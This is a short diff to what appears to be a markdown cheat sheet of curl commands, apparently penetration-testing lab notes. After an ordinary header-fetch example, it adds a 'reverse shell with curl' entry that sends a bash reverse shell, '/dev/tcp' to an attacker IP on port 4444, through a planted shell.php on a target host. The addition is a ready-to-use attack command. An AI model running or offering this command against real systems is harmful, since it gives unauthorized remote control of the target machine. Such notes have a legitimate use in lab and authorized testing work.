@@ -17,3 +17,7 @@ Get an Http header:
 ```
 curl -I <http://ip-address/
 ```
+Get a reverse shell with curl:
+```
+curl 10.10.11.116/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'"
+```
